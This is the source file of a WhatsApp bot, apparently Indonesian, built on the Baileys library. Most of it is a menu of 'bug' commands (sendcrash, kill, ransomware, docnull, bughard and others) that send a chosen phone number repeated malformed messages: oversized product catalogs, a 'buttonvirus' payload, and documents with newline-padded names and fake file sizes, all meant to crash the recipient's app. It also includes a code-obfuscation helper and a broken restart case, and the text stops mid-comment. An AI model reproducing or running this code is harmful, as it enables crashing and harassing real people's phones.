const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'BAGAS BOTZ'
global.ownerNumber = ["62882006726140@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}

module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
             const isGroup = diablobotwhatsapp.chat.endsWith('@g.us')
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

switch (command) {

case 'menu':
let uptime = await runtime(process.uptime())
namabot = `PREMIUM BOT`
descnya = `BOT INI MILIK
https://wa.me/6281220670449`
jiren = ` 
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞KenzBotz──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›
│➳ OWNER : KENSANZ
│➳ WA OWNER : wa.me/62882003907027
 |  ➳ADDAKSES:10K
   ➳UBAH WA JADI BOT:60K
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭──────────────────┈ 
│「  𝗕𝗨𝗚 𝗠𝗘𝗡𝗨  」
├──────────────────┈
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}sendcrash (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}sendbug (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}sendfc (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}santet (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}santetv2 (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}kill (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}trava (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}sendtroli (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}savage (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}dead (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}ransomware (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}bokepto (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}docnull (62xxx)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}bughard (62xxx)
│ contoh : sendfc 6281234126765
│ 
├──────────────────┈
│「 𝗢𝗧𝗛𝗘𝗥 」
├──────────────────┈
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}tag (text)
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}stats ( untuk cek status )
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}restart ( untuk restart )
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}addakses
│【♡ۣۜۜ፝͜͜͡͡✿➣  ${prefix}delakses
│──────────────────┈
`
diablobotwhatsapp.reply(jiren)
break
case 'addakses':
if (!itsMediablo) return diablobotwhatsapp.reply(`chat ownernya dlu dek!!`)
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281220670449`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'delakses':
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281220670449`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'tag': {
if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
}
break
case 'restart':{
if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let 
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
diablobotwhatsapp.reply(respon)
}
break
    
case 'ransomware':
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
 textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
 diablobotwhatsapp.reply(textnyasu)
        if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '3'
    for (let i = 0; i < jumlah; i++) {
    diablo.sendMessage(num, { 
    document: ppnyauser, 
    fileName: `🔥 RANSOMWARE ☠\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.KONTOL.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
    mimetype: `application/txt`, 
    jpegThumbnail: ppnyauser, 
    fileLength: "999999999", 
    mentions:[sender] }, {quoted:lep})
    await sleep(1000)
    }
    }
    break    
    case 'docnull':
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
 textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
 diablobotwhatsapp.reply(textnyasu)
        if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '3'
    for (let i = 0; i < jumlah; i++) {
    diablo.sendMessage(num, { 
    document: ppnyauser, 
    fileName: `ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.null.𝗞𝗔𝗠𝗨 𝗡𝗔𝗡𝗬𝗔`, 
    mimetype: `application/txt`, 
    jpegThumbnail: ppnyauser, 
    fileLength: "999999999", 
    mentions:[sender] }, {quoted:lep})
    await sleep(1000)
    }
    }
    break    
    case 'bokepto':
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
 textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
 diablobotwhatsapp.reply(textnyasu)
        if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '3'
    for (let i = 0; i < jumlah; i++) {
    diablo.sendMessage(num, { 
    document: ppnyauser, 
    fileName: `VIRAL TERBARU 🔞\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.KONTOL.𝗢𝗧𝗔𝗞 𝗕𝗢𝗞𝗘𝗣`, 
    mimetype: `application/txt`, 
    jpegThumbnail: ppnyauser, 
    fileLength: "999999999", 
    mentions:[sender] }, {quoted:lep})
    await sleep(1000)
    }
    }
    break    
case 'sendbug': 
textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
{
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
     jumlah = '2'
    waktu = '3s'
    for (let i = 0; i < jumlah; i++) {
    diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
    await sleep(ms(waktu))
    }
    }
    break
    case 'sendfc':
        textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
         {
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
     jumlah = '2'
    waktu = '3s'
    for (let i = 0; i < jumlah; i++) {
    diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
    await sleep(ms(waktu))
    }
    }
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
         jumlah = '2'
        waktu = '3s'
        for (let i = 0; i < jumlah; i++) {
        diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
        await sleep(ms(waktu))
        }
        }
    break
    case 'santet':
case 'sendcrash': 
textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
{
if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '10'
waktu = '4s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `MAMPUS FC CHUAKS`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/0`
},
"businessOwnerJid": "6281220670449@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
 
}
break
case 'sendtroli':
case 'kill': 
 textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
 
{
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `WARNING THIS IS KILL VIRUS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `KILLER VIRUS V9999`,
    "url": `https://wa.me/0`
    },
    "businessOwnerJid": "6281220670449@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
}
{
    if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `WARNING THIS IS KILL VIRUS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `KILLER VIRUS V`,
    "url": `https://wa.me/0`
    },
    "businessOwnerJid": "6281220670449@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
    }
    break 
    case 'bughard':
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
        textnyasu = `Sukses Send Bug Ke Nomor Target ✅`
    diablobotwhatsapp.reply(textnyasu)
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD BY JOKER`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD BY JOKER`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD BY JOKER`, id: ``}},
